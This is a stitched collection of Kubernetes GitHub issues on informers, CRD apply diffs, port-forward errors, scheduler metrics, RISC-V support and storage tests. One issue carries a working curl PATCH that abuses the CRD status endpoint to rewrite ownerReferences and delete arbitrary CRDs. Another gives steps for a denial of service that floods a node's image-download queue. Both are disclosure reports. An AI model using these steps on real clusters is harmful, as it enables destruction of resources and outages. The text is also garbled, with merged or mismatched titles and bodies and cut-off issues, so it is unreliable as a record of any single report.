func (s *sharedIndexInformer) SetStore(store ThreadSafeStore) error {
	s.startedLock.Lock()
	defer s.startedLock.Unlock()

	if s.started {
		return fmt.Errorf("informer has already started")
	}
	s.indexer = NewIndexerWithStore(DeletionHandlingMetaNamespaceKeyFunc, store)
	return nil
}
```




### Why is this needed?

If we use a client-go informer to query Kubernetes resources, the memory utilization is very high for larger clusters.
This would make informers unusable for watching Kubernetes resources.

```
spec:
```

```
  creationTimestamp: "2025-12-06T08:51:51Z"
  generation: 1

  resourceVersion: "87014077"
  uid: b377e8d1-1812-4027-befc-f9b079ce0ac2
spec:

  - a: pool1
    b: value-b1
  - a: pool2
    b: value-b2

```

4.
Use kubectl edit to add field c to the first item of the array

5.
Verify last-applied annotation does not contain field c

```
apiVersion: mycompany.com/v1alpha1
kind: ExampleMachineMap
metadata:
  annotations:
    kubectl.kubernetes.io/last-applied-configuration: |
      {"apiVersion":"mycompany.com/v1alpha1","kind":"ExampleMachineMap","metadata":{"annotations":{},"name":"examplemachinemap-sample","namespace":"cde"},"spec":{"machinePools":[{"a":"pool1","b":"value-b1"},{"a":"pool2","b":"value-b2"}]}}
```

Perform kubectl diff on the original manifest from step 2 and notice field 'c' is *not* marked for deletion because x-kubernetes-list-type is map and not atomic and field c was added outside of the 'apply' so is not in the last-applied annotation (as per non-Custom-Resource https://kubernetes.io/docs/tasks/manage-kubernetes-objects/declarative-config/#how-to-update-objects)

6 Actual.
Perform kubectl diff on the original manifest from step 2 and notice field 'c' is marked for deletion, despite x-kubernetes-list-type being map and not atomic and field c not existing in the last-applied annotation

```
kubectl diff -f ./ex-1.yaml
...
-  generation: 2
+  generation: 3
   name: examplemachinemap-sample
   namespace: cde
   resourceVersion: "87014592"
@@ -14,6 +14,5 @@

   - a: pool1
     b: value-b1
-    c: c

     b: value-b2
```

---

Ref r.e. `kubernetes-list-type`

> x-kubernetes-list-type (string)
> 
> x-kubernetes-list-type annotates an array to further describe its topology. This extension must only be used on lists and may have 3 possible values:
> 
> atomic: the list is treated as a single entity, like a scalar. Atomic lists will be entirely replaced when updated. This extension may be used on any type of list (struct, scalar, ...).
> 
> set: Sets are lists that must not have multiple items with the same value. Each value must be a scalar, an object with x-kubernetes-map-type atomic or an array with x-kubernetes-list-type atomic.
> 
> map: These lists are like maps in that their elements have a non-index key used to identify them. Order is preserved upon merge. The map tag must only be used on a list with elements of type object. Defaults to atomic for arrays.

https://kubernetes.io/docs/reference/kubernetes-api/extend-resources/custom-resource-definition-v1/#JSONSchemaProps

The docs mention only for `atomic` will "lists will be entirely replaced when updated"

title: Improper Metadata Restriction in CRD Status API Allows Arbitrary CRD Deletion
body:
### What happened?

The crd/status API is intended to only modify the status field of a CRD resource. However, when it uses ResetObjectMetaForStatus to filter other fields, oldObj is not passed, which causes this line of code to become ineffective. (https://github.com/kubernetes/kubernetes/blob/master/staging/src/k8s.io/apiextensions-apiserver/pkg/registry/customresourcedefinition/strategy.go#L273C2-L273C73)

As a result, the crd/status API can actually modify the metadata fields of a CRD resource. Based on this, the metadata.ownerReferences field can be altered, allowing an attacker to delete arbitrary CRD resources.


### What did you expect to happen?

Arbitrary CRD Deletion

### How can we reproduce it (as minimally and precisely as possible)?

Create a test CRD:
```
kubectl apply -f - <<EOF
apiVersion: apiextensions.k8s.io/v1
kind: CustomResourceDefinition
metadata:
  name: demos.example.com
spec:
  group: example.com
  scope: Namespaced
  names:
    plural: demos
    singular: demo
    kind: Demo
    shortNames:
      - dm
  versions:
    - name: v1
      served: true
      storage: true
      schema:
        openAPIV3Schema:
          type: object
          properties:
            spec:
              type: object
              properties:
                message:
                  type: string
            status:
              type: object
              properties:
                phase:
                  type: string
                observedGeneration:
                  type: integer
      subresources:
        status: {}
EOF
```
Modify metadata field through crd/status API to delete CRD.
```
curl -k -X PATCH https://$APISERVER:6443/apis/apiextensions.k8s.io/v1/customresourcedefinitions/demos.example.com/status \
--header 'Content-Type: application/json-patch+json' \
--header "Authorization: Bearer $TOKEN" \
--data '[
    {
      "op": "replace",
      "path": "/metadata/ownerReferences",
      "value": [
        {
          "apiVersion": "rbac.authorization.k8s.io/v1",
          "kind": "ClusterRole",
          "name": "a",
          "uid": "xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx",
          "controller": true,
          "blockOwnerDeletion": false
        }
      ]
    }
  ]'
```

title: Pending image downloads of deleted containers are never interrupted, leading to possible DoS
body:
### What happened?

During a research project on Kubernetes, we discovered a potential bug on any reasonably recent Kubernetes version (we tested in 1.25 to 1.29) that affects all clusters regardless of the container runtime used. By exploiting the fact that the CRI-API does not maintain the container download status, we created a denial of service via resource exhaustion.

----

When an user deploys a pod, the deployed container(s) may rely on image(s) that are not present on the target node, triggering a download by the container runtime. However, if that pod is deleted (either with or without the `--force` flag) before the container runtime completes the download of the image, this download will be carried on anyway. Kubernetes tracks no information at all about the download, and there is no way of interrupting it unless the container runtime is forcibly terminated and recreated.

This (useless, as the images will never be used) sequence of downloads will waste the node’s CPU and network bandwidth and block the download queue, preventing the deployment of other containers with images yet to be downloaded. We experimented on a wide variety of settings, including but not limited to private clouds, public clouds and edge devices, with different container runtimes (containerd and CRI-O) and different Kubernetes providers (kubeadm, microk8s, and GKE).

The impact this bug has on the cluster is twofold. First, by the way the download queue is implemented in the container runtime, queuing up multiple image download requests prevents legitimate users from deploying workloads that require an image download to be run. Since deleting a container from Kubernetes does not affect the container runtime download queue, this queue can grow uncontrolled **even if the requests are canceled before the download starts**. This starvation can continue for as long as the attacker likes, as long as they have access to the cluster and can request to download fresh images not present on the node.

Secondly, this bug has a significant impact on the target node's resources. This uncontrolled resource usage is untied from any service account or quota and will potentially skew the information available to the scheduler. Furthermore, even a quota of exactly one Pod does not hamper the attack as employing the `--force` flag allows attackers to rapidly deploy downloads and wipe the Pod from the API, never exceeding it.


### What did you expect to happen?

As a Pod is deleted but its containers have not been instantiated yet and their image is still being downloaded or is queued for download, such download should be aborted or evicted from the queue as soon as the target node is informed of the deletion.

### How can we reproduce it (as minimally and precisely as possible)?

1. Install a fresh Kubernetes cluster using kubeadm. We used versions 1.25 to 1.29. No modifications are needed to any configuration of the cluster. Service Accounts, Quotas, RBAC/ABAC configurations, etc… are not relevant to the attack’s success.
2. Identify a node to attack in the cluster if there is more than one. Add a NodeSelector to any Pod deployed in subsequent steps so that they can only be deployed on that node.
3. Identify one or more Docker images that are able to be downloaded from the cluster and are not present in the node’s image cache. The content, configuration, etc.. of the image is irrelevant.
4. Repeat until there are non-downloaded Docker images available:
  - Deploy a Pod (with the NodeSelector) of a certain image i;
  - Wait 1-2 seconds;
  - Request the Pod’s deletion (possibly with --force)
5. The victim node’s image download queue will now be filled up with bogus requests, preventing any user's download of further images in the cluster until the attack is stopped and the downloads complete or the node’s containerd process is restarted.
6. On clusters with k8s version >= 1.27 and MaxParallelImagePulls set to > 1, the attack will still be successful, so long as the attacker manages to request enough images to fill up the parallelism provided by MaxParallelImagePulls. 

### Anything else we need to know?

We contacted the Kubernetes Security Team in late 2023, and we were informed that this issue is not considered a vulnerability and we could proceed with making it public at our own discretion.

We extensively studied this issue, its impact, limitations and a proof of concept for blocking it in a publication. The paper is currently under evaluation for a submission in a journal, and its preprint is available at this link: [https://arxiv.org/abs/2401.10582](https://arxiv.org/abs/2401.10582)

### Kubernetes version

<details>

This details refer to a specific set of tests we made in the past, but we replicated the attack in several other scenarios.


### Cloud provider

Currently, if I am interpreting the documentation correctly, if you set internalTrafficPolicy to Local and there are no local endpoints, it just fails. Well, that's kinda weirdly un-useful unless I am missing something?

The only way that could be useful that I can currently think of, is if you have DaemonSets for all your applications, since that's the only way I am aware of to completely guarantee there is at least a replica per node.

So, in my opinion this feature needs at least one more keyword- 'fallback.' Meaning if there are no local endpoints, use whatever.

But I could see people wanting a lot more control over this in general. It's just too primitive in its current state. Again, if I am missing something here or misinterpreting this, please educate me.

title: Make churnOp in scheduler_perf more useful for recreating the pods
body:
### What would you like to be added?

Recreate mode in `churnOp` in scheduler_perf tests is not well suited for gradually adding and deleting the pods. Especially, it doesn't ensure the pod is scheduled before deleting it, which can result in measuring different paths of the code implicitly within one test case like in [this example](https://github.com/kubernetes/kubernetes/pull/125504#discussion_r1644424572). 

/sig scheduling

### Why is this needed?

It will make the tests more stable and result in more meaningful measurements. Adding the test cases like #125504 will be much easier in the future.

title: kube_codegen.sh: validation-gen --readonly-pkg flags are passed as a single argument due to quoting
body:
### What happened?

Encountered when working on https://github.com/kubernetes/kubernetes/pull/137349. 

In kube_codegen.sh, the [--readonly-pkg flags for validation-gen](https://github.com/kubernetes/kubernetes/blob/master/staging/src/k8s.io/code-generator/kube_codegen.sh#L210) are wrapped in double quotes:

`"$(printf -- " --readonly-pkg %s" "${validation_readonly_pkgs[@]}")"`

Double-quoting $() suppresses word splitting, so the entire output becomes a single argument to the generator.

pflag.StringSliceVar silently stores the whole string as one entry that never matches any package, so readonly protection is a no-op for out-of-tree projects using kube_codegen.sh.


### How can we reproduce it (as minimally and precisely as possible)?

```
$ set -- "$(printf -- " --readonly-pkg %s" "k8s.io/apimachinery/pkg/apis/meta/v1" "k8s.io/apimachinery/pkg/runtime")"
$ echo "Number of args: $#"
Number of args: 1
$ echo "Arg 1: '$1'"
Arg 1: ' --readonly-pkg k8s.io/apimachinery/pkg/apis/meta/v1 --readonly-pkg k8s.io/apimachinery/pkg/runtime'
```

Without quotes, the args are correctly set.

```
$ set -- $(printf -- " --readonly-pkg %s" "k8s.io/apimachinery/pkg/apis/meta/v1" "k8s.io/apimachinery/pkg/runtime")
$ echo "Number of args: $#"
```

title: kube-scheduler /configz endpoint returns internal configuration type
kube-proxy /configz endpoint returns internal configuration type
body:
The `kube-proxy` component currently registers its internal configuration type with the `/configz` endpoint. This is incorrect as `/configz` should return a stable, versioned API type.

In `cmd/kube-proxy/app/server.go`:
```go
	cz, err := configz.New(kubeproxyconfig.GroupName)
	if err != nil {
		return nil, fmt.Errorf("unable to register configz: %s", err)
	}
	cz.Set(config)
```
`config` is of type `k8s.io/kubernetes/pkg/proxy/apis/config.KubeProxyConfiguration` (internal).

**Expected Behavior:**
The internal configuration should be converted to a versioned type (e.g., `k8s.io/kube-proxy/config/v1alpha1.KubeProxyConfiguration`) before being passed to `configz.Set()`.

/sig networking
/cc @liggitt

Routed from https://github.com/kubernetes/kubernetes/pull/136044/changes#r2742845922

title: Container remains ready causing Pod and EndpointSlice to Report False Ready State for the entire terminationGracePeriod
body:
### What happened?

containerStatuses.ready is not set to false immediately when a pod it deleted. This is results in pod reporting ready status when the pod is deleted after terminationGracePeriodSeconds have passed. 

### What did you expect to happen?

After the pod termination starts, the containerStatuses should set ready: false for all the containers in the pod and hence pod status should report as ready: false. 

### How can we reproduce it (as minimally and precisely as possible)?

```
apiVersion: v1
kind: Pod
metadata:
  name: "b382559131"
  namespace: "default"
spec:
  terminationGracePeriodSeconds: 60
  restartPolicy: Never
  containers:
  - name: c1
    image: "k8s.gcr.io/busybox"
    command: ["/bin/sh", "-c"]
    args:
      - |
        _term() {
          rm -f /tmp/ready
        }
        trap _term SIGTERM

        touch /tmp/ready

        while true; do
          echo 'helloc1'
          ls /tmp/die_now && echo 'dying in 5s...' && sleep 5 && exit 0
          sleep 1
        done
    readinessProbe:
      exec:
        command:
        - sh
        - -c
        - |
          if [ -f "/tmp/ready" ]; then
            exit 0
          else
            touch /tmp/die_now
            exit 1
          fi
  - name: c2
    image: "k8s.gcr.io/busybox"
    command:
      - sh
      - -c
      - "_term() { while true; do echo \"hello_term_c2\"; sleep 1; done } ; trap _term SIGTERM; while true; do echo \"helloc2\"; sleep 1; done"
    
```

Run the above pod and issue a delete call when the containers become ready

$ kubectl delete pod b382559131

Monitor the readiness status:

$ while true; do date && kubectl get pod b382559131 -o json | jq .status.containerStatuses.[].ready && sleep 1; done
Sat Dec 21 11:05:16 PM PST 2024
true
true

The pod has a termination grace period of 60s. The delete was issued at 11:05:21 and we see that the ready status was true until the pod was deleted at 11:06:22 (60s later).

title: Feature request: parse-able error stream content when port forwarding
body:
### What would you like to be added?

Parse-able error stream content when port forwarding

### Why is this needed?


Client-go's PortForwarder [reads from the error stream](https://github.com/kubernetes/kubernetes/blob/1df24569a0bf62a528c49f73fdb236fd56eb05ee/staging/src/k8s.io/client-go/tools/portforward/portforward.go#L352-L362), and if anything is received, it [terminates the listener and exits](https://github.com/kubernetes/kubernetes/blob/1df24569a0bf62a528c49f73fdb236fd56eb05ee/staging/src/k8s.io/client-go/tools/portforward/portforward.go#L405-L409)

Often times the error stream will contain a message like `connection refused` or `network namespace for sandbox "ba380ea22e0a0f92d2977c9a56ce03cfc0bafe90e77b284ed297d9d5c8db7e14" is closed
` if the pod terminates or otherwise becomes unreachable:

* `error forwarding port 5432 to pod 8df2641c23fa6d81b236694874f782796c5d17390071bf7202a390da2c776f44, uid : failed to execute portforward in network namespace "/var/run/netns/cni-6311fb2d-d90b-fb84-ba8b-79d627252113": failed to connect to localhost:5432 inside namespace "8df2641c23fa6d81b236694874f782796c5d17390071bf7202a390da2c776f44", IPv4: dial tcp4 127.0.0.1:5432: connect: connection refused IPv6 dial tcp6 [::1]:5432: connect: connection refused`
* `error forwarding port 5432 to pod ba380ea22e0a0f92d2977c9a56ce03cfc0bafe90e77b284ed297d9d5c8db7e14, uid : network namespace for sandbox "ba380ea22e0a0f92d2977c9a56ce03cfc0bafe90e77b284ed297d9d5c8db7e14" is closed`

In these cases, it is the correct action for PortForwarder to terminate its listener and exit because the pod is unable to accept and handle new connections.

Other times however, the error stream will contain something that is non-fatal, like `connection reset by peer`, in which case the pod is still running and is still able to accept new connections:

* `error forwarding port 5432 to pod 8df2641c23fa6d81b236694874f782796c5d17390071bf7202a390da2c776f44, uid : failed to execute portforward in network namespace "/var/run/netns/cni-6311fb2d-d90b-fb84-ba8b-79d627252113": read tcp4 127.0.0.1:43802->127.0.0.1:5432: read: connection reset by peer`

In this situation, it is undesirable for PortForwarder to terminate. 

In fact this [causes a problem when using psql connected to a postgres instance using SSL](https://github.com/kubernetes/kubernetes/issues/111825). Postgres issues an ECONNRESET whenever the user who is connected using SSL changes to a different database (using the `\c foo` command for example).

My first instinct was that Client-go's PortForwarder should read what is coming on the error stream, do some kind of regex or other matching, and if it is something non-fatal like "connection reset by peer", then do not terminate the listener. But this isn't a good approach because it relies on the string being written by the container runtime to be a specific string, and for it to be consistent across all container runtimes. It is too fragile.

What if the container runtime can write to the error stream in a consistent and structured way, such as a specific JSON format? 

Then, client-go can parse the message and decide what to do for each type of error. The exact format doesn't matter, but here is an example of what I'm thinking:

Old error stream content:
```
error forwarding port 5432 to pod 8df2641c23fa6d81b236694874f782796c5d17390071bf7202a390da2c776f44, uid : failed to execute portforward in network namespace "/var/run/netns/cni-6311fb2d-d90b-fb84-ba8b-79d627252113": read tcp4 127.0.0.1:43802->127.0.0.1:5432: read: connection reset by peer
```

New error stream content (example of what I'm proposing):
```
{
   "num": "104",
   "name": "ECONNRESET",
   "message": "connection reset by peer"
   "details": "error forwarding port 5432 to pod 8df2641c23fa6d81b236694874f782796c5d17390071bf7202a390da2c776f44, uid : failed to execute portforward in network namespace \"/var/run/netns/cni-6311fb2d-d90b-fb84-ba8b-79d627252113\": read tcp4 127.0.0.1:43802->127.0.0.1:5432: read: connection reset by peer"
}
```

With a new detailed error format, client-go would be able to inspect the `name` field to see if it is `ECONNRESET` and choose not to stop the listener in this case.

Additionally, if the container runtime is able to determine if the pod is still available or not, then it could set a field on the error indicating this. Maybe something like `"fatal": "false"` or `"recoverable": "true"`, or something along those lines. This would allow the client to base its decision on this instead of having to code to handle individual error types.

---

References:

* Containerd error stream writer: https://github.com/containerd/containerd/blob/3508ddd3dd96796c134196f285d56374ccaeeaeb/pkg/cri/streaming/portforward/httpstream.go#L255-L259

* PR comment where I traced where the text "connection reset by peer" is coming from: https://github.com/kubernetes/kubernetes/pull/111860#issuecomment-1245862906

title: Remove / deprecate the `csi.volume.kubernetes.io/nodeid` annotation of the Node object?
body:
This annotation `csi.volume.kubernetes.io/nodeid` was used internally to specify the identifier for a node as understood by the Container Storage Interface (CSI) driver. kubelet [populated this annotation](https://github.com/kubernetes/kubernetes/blob/master/pkg/volume/csi/nodeinfomanager/nodeinfomanager.go#L118) by calling the `NodeGetInfo` gRPC method of the CSI driver to retrieve the node ID during the driver registration process. The external-attacher sidecar container [read this annotation](https://github.com/kubernetes-csi/external-attacher/pull/213) to get the node ID when attaching or detaching volumes.

But it should be deprecated in favor of the `CSINode` object, which provides the same functionality via the `spec.drivers[].nodeID` field. And it needs the csi driver to bump the external-attacher sidecar to v2.2 or later. See [CHANGELOG](https://github.com/kubernetes-csi/external-attacher/blob/cc32e8cebcb4433b84c26aacc59e200aecd9f5be/CHANGELOG/CHANGELOG-2.2.md?plain=1#L11) for details.

According to [the external-attacher documentation](https://kubernetes-csi.github.io/docs/external-attacher.html), v2.2 is out of support. So all the third-party CSI drivers should upgrade the external-attacher sidecar container to v4.6.1 or a later version, which does not rely on the deprecated annotation anymore.

The [old design proposal](https://github.com/kubernetes/design-proposals-archive/blob/main/storage/container-storage-interface.md) indicates that this annotation is deprecated and will be removed according to deprecation policy (1 year after deprecation) with a TODO item (mark deprecation date).

Can we mark the "stable" annotation `csi.volume.kubernetes.io/nodeid` as deprecated in 1.36 and remove it in 1.40 (or 1 year after the deprecation)?

- https://kubernetes.io/docs/reference/using-api/deprecation-policy/
- https://github.com/kubernetes/website/pull/54035 document the deprecation of this annotation.

If removal is planned, should we automatically remove the annotation from the existing Node objects when kubelet stops populating it?

/sig node
/sig storage
/cc @jsafrane @dims @liggitt

title: scheduler: add metric to measure pod preemption wait time
body:
Today there is no way to measure how long a pod waits between the first scheduling attempt where preemption is triggered and the attempt where binding succeeds. In clusters that rely heavily on preemption, it's a useful signal to have to measure the impact of preemption on pod scheduling & startup across scheduling attempts.

There already exist some metrics around preemption like `preemption_attempts_total` and `preemption_victims` but there's no way to quantify the impact on scheduling duration using these metrics. It's also possible to look at the plugin duration for preemption to quantify the time taken to issue the delete calls, but this doesn't capture how long it takes for victims to terminate.

It would be great to see a metric added that basically counts
`preemption_to_binding_duration_seconds = time of successful bind - time of first successful preemption nomination`. This would also include the time the pod spends in the unschedulable queue, but that's part of the cost of preemption.

title: Proposal: Official Support for RISC-V Architecture and RVA23 Advancements in Kubernetes Releases
body:
---

## 1. What is RISC-V?

- An open and royalty-free Instruction Set Architecture (ISA)
- Modular and extensible, enabling innovation
- Supported by a rapidly growing global hardware and software ecosystem
- Applicable to embedded, server, AI, and cloud computing fields

---

## 2. RISC-V Ecosystem and Mainstream Software Support

- Supported by major operating systems (Linux, openEuler, Debian, etc.)
- Complete toolchains (GCC, LLVM, QEMU, etc.)
- Active community and industry contributions, ecosystem expanding rapidly
- Kubernetes-related components (e.g., containerd, Kubelet) already build and run on RISC-V

---

## 3. RVA23: A New Milestone for RISC-V

### Vector Extension

- Efficient data parallelism, ideal for AI/ML, big data, and similar workloads
- Flexible vector length, adaptable to various hardware implementations
- Toolchain and runtime support are steadily improving

### Virtualization

- Hardware-level virtualization for strong multi-tenant and isolation capabilities
- KVM and QEMU have initial RISC-V virtualization support
- Facilitates easier migration and expansion of cloud-native infrastructure

---

## 4. How RISC-V Aligns with Kubernetes

- Reduces infrastructure costs, expands use case diversity
- Vector acceleration improves performance for AI/ML and other cloud-native workloads
- Virtualization enhances multi-tenancy and security
- Enables deployment across edge, cloud, and data center scenarios

---

## 5. Current Challenge: No Official RISC-V Artifacts from Kubernetes

- Kubernetes does not currently publish release binaries or container images for the RISC-V architecture
- Community adaptation exists, but lack of official support limits downstream ecosystem growth
- The absence of official artifacts creates gaps in testing, integration, and user experience

---

### What happened?

title: Extended resource cannot be over-committed
body:
Since this PR [#48922](https://github.com/kubernetes/kubernetes/pull/48922), extended resource outside *kubernetes.io namespace cannot be over-committed.

From the implementation of kubernetes, this is just a validation in apiserver, this constraint itself has no other effect (or a side effect without it).

Take a general look at the current rules:

- all resources are expressed within kubernetes using resource.Quantity, which means you can use the expression "2000m".
- resources without '/' or contain 'kubernetes.io' are treated with native resource，and native resource can be over-commited.
- all resources except native ones can not be over-commited, there is a validation in apiserver to ensure it.
- all resources except cpu are integers, apiserver will check for decimals and scheduler will use  quantity.Value() to compute resource.

In some scenarios, custom extension resources need the semantics of limit > request, for example, the IOPS and BPS resources of the network and disk IO. Under the above restrictions, similar requirements need to be achieved by this:

1. add a component(device-plugin or  similar component) for reporting extended resources to node
2. user fills in the request value(net-bps request) in the extended resource, add add a annotation to express the net-bps limit
3. related components need to be customized to perceive this annotation, ext., if the scheduling scoring plugin needs to rely on limit, the scheduler needs to be aware of this annotation
 
This complicates the expansion of upper-level users and makes the logic confusing. I propose to cancel the restriction that extended resources can not be over-commited. At the implementation level, we can start from a namespace with a certain prefix and gradually drive the ecology to perceive this change.

title: apiserver/storage: test caching and indexing layers at the unit level
body:
### What would you like to be added?

Today, unit-level tests only exist for `*etcd3.store{}`, and cannot be run against any other implementation of `storage.Interface`. In general, these tests define what it means to be a correct implementation of `storage.Interface`, and only use exported functionality. We aim to refactor the tests to accept any `storage.Interface`. This allows for testing the entire exported function space for an etcd storage layer with whichever caching and indexing layers on top.

The following tests can be ported as-is, since they use only `storage.Interface` methods:

In #109833:
- [x] `TestCreateWithTTL`
- [x] `TestCreateWithKeyExist`
- [x] `TestGet`
- [x] `TestUnconditionalDelete`
- [x] `TestConditionalDelete`
- [x] `TestDeleteWithSuggestion`
- [x] `TestDeleteWithSuggestionAndConflict`
- [x] `TestDeleteWithSuggestionOfDeletedObject`
- [x] `TestValidateDeletionWithSuggestion`
- [x] `TestPreconditionalDeleteWithSuggestion`
- [x] `TestGetListNonRecursive`
- [x] `TestGuaranteedUpdateWithTTL`
- [x] `TestGuaranteedUpdateWithConflict`
- [x] `TestGuaranteedUpdateWithSuggestionAndConflict`
- [x] `TestCount`
- [x] `TestWatch`
- [x] `TestDeleteTriggerWatch`
- [x] `TestWatchFromNoneZero`
- [x] `TestWatchInitializationSignal`

Other:
- [x] `TestProgressNotify` (requires that the underlying etcd is configured to send bookmarks)

The following tests currently require the etcd client, and need to be re-thought or adapted:

- [x] `TestCreate` uses the etcd client to: https://github.com/kubernetes/kubernetes/pull/109909
    - make sure nothing exists at the key before creation. Unclear what this is enforcing, and perhaps could use `storage.Interface.Get()` instead?
    - check invariants about data in the store, should be relegated to an `*etcd3.store{}` specific test only
- [x]  `TestGuaranteedUpdate` uses the etcd client to:
   - check invariants about data in the store, should be relegated to an `*etcd3.store{}` specific test only
- [x] `TestGuaranteedUpdateChecksStoredData` uses the etcd client to:
  - put data into the store using a different codec
- [x] `TestList` uses the etcd client to: https://github.com/kubernetes/kubernetes/pull/110024
  - share a single underlying storage between two `*etcd3.store{}` implementations (with and without paging)
- [x] `TestListContinuation` uses the etcd client to:
  - track the number of calls made to etcd
- [x] `TestListPaginationRareObject` uses the etcd client to:
  - track the number of calls made to etcd
- [x] `TestListContinuationWithFilter` uses the etcd client to:
  - track the number of calls made to etcd
- [x] `TestListInconsistentContinuation` uses the etcd client to:
  - cause a compaction in order to test clients asking for compacted revisions
- [x] `TestWatchFromZero` uses the etcd client to:
  - cause a compaction in order to test clients asking for compacted revisions
- [x] `TestWatchError` uses the etcd client to:
  - share a single underlying storage between two `*etcd3.store{}` implementations (with a valid and invalid codec)
- [x] `TestWatchDeleteEventObjectHaveLatestRV` uses the etcd client to:
  - create a raw watch, we check that the mod revision at which the raw watch shows us the delete is the same as the revision the `storage.Interface` uses to report the deletion ... but if we know nothing else is touching our storage, why not just use `storage.Interface.Get()` (or the returned value from creating) to check that the last RV we saw is what it's deleted at?


The following tests currently touch internals of `*etcd3.store{}`:

- [x]  `TestGuaranteedUpdate` touches:
   - `store.transformer` in order to inject staleness to cause an update when the semantic value of the data does not change
- [x] `TestGuaranteedUpdateChecksStoredData` touches:
  - `store.transformer` in order to inject staleness to cause an update when the semantic value of the data does not change
- [x] `TestTransformationFailure` touches:
  - `store.transformer` in order to test behavior under transformation failure
- [x] `TestListContinuation` touches:
  - `store.transformer` to count the number of items read from etcd
- [x] `TestListPaginationRareObject` touches:
  - `store.transformer` to count the number of items read from etcd
- [x] `TestListContinuationWithFilter` touches:
  - `store.transformer` to count the number of items read from etcd
- [x] `TestConsistentList` touches:
  - `store.transformer` to ... cause side-effect reads during a paginated LIST call ? @wojtek-t you wrote this, perhaps there's a less invasive way to do this
- [x] `TestLeaseMaxObjectCount` touches:
  - `store.leaseManager` - this is etcd-specific, so perhaps it remains in the `*etcd3.store{}` level?
- [x] `TestWatchFromZero` touches:
  - `store.versioner`, but that is a singleton and there's no real reason that needs to be an instance variable of the store as opposed to an exported package-level function?
- [x] `TestWatchContextCancel` touches: https://github.com/kubernetes/kubernetes/pull/109914
  - `store.watcher.Watch()`, but we're testing user-facing behavior of the watch method, so it's not clear why calling the watcher specifically is necessary here
- [x] `TestWatchErrResultNotBlockAfterCancel` touches:
  - `store.watcher.createWatchChan()` - this looks like an implementation detail of the watcher?
- [x] `TestWatchDeleteEventObjectHaveLatestRV` touches:
  - `store.versioner`, but that is a singleton and there's no real reason that needs to be an instance variable of the store as opposed to an exported package-level function?

Next steps:

- [x] migrate all of the tests that can be used as-is into `*_tests.go` files and change their signature to accept a `storage.Interface`, import these and use them to test caching and indexing layers (#109833)
- [x] make a decision for all of the tests that touch the `etcd` client whether they could instead use the `storage.Interface` itself, etc
- [x] similarly figure out if the tests that touch internals of the `*etcd3.store{}` are useful to test other `storage.Interface` implementations, and, if so, how they can be adapted

/sig api-machinery
/assign @stevekuznetsov @wojtek-t 
/cc @liggitt @lavalamp 

### Why is this needed?

To improve our ability to test the caching and indexing layers that sit on top of the etcd storage implementation.

title: [client-go] Resource leak in kubernetes/client-go/tools/leaderelection
eventsv1 API documentation seems inaccurate
body:
The eventsv1.Event documentation says:

```
	// reason is why the action was taken. It is human-readable.
	// This field cannot be empty for new Events and it can have at most 128 characters.
	Reason string `json:"reason,omitempty" protobuf:"bytes,7,name=reason"`
```

The "human-readable" part contradicts everything else I can find (such as the examples in [KEP-383](https://github.com/kubernetes/enhancements/tree/master/keps/sig-instrumentation/383-new-event-api-ga-graduation#few-examples)), and in particular, `corev1.Event.Reason` (which is the same field, right?) is "`a short, machine understandable string`".

The "cannot be empty for new Events" also contradicts the examples in KEP-383, though maybe that's a case of the KEP being out of date with what was eventually agreed on.

I'm not sure if there are other bugs in the documentation as well. It seems that the docs were updated kind of at the last minute while pushing to v1 (https://github.com/kubernetes/kubernetes/pull/91645#discussion_r437017227)


/kind bug
/kind documentation
/sig instrumentation

title: Workqueue's add function `queue.Add()` doesn't tell whether an item was successfully added or not
body:
### What happened?

While using `workqueue/queue.go` for one of my usecases, I naturally came across its `Add()` function. Essentially, if the queue is in a shutdown mode, it just does a plain `return` and there is no way for the caller to directly know if the item got added or not: 
https://github.com/kubernetes/kubernetes/blob/016b96ca3896d27b37c5b2d6e223fb3320a0fdec/staging/src/k8s.io/client-go/util/workqueue/queue.go#L120-L139

One way to do this would be to get the size of the queue(`queue.Len()`) before and after adding and seeing if the size remained same or increased but this might not be right way to go about it I feel (Please suggest some other better ways)

### What did you expect to happen?

Just like the `Get()` function has a return type which tells us whether the queue was getting shutdown at the time of calling `Get()`:
https://github.com/kubernetes/kubernetes/blob/016b96ca3896d27b37c5b2d6e223fb3320a0fdec/staging/src/k8s.io/client-go/util/workqueue/queue.go#L153-L175

Similarly, does it make sense to have a similar kind of thing for `Add()` as well instead of doing a plain `return`? Or correct me if the queue was designed not to return anything on `Add()` because of some tested cases?

Looking at the [code](https://github.com/kubernetes/kubernetes/blob/016b96ca3896d27b37c5b2d6e223fb3320a0fdec/staging/src/k8s.io/client-go/util/workqueue/queue.go#L120)
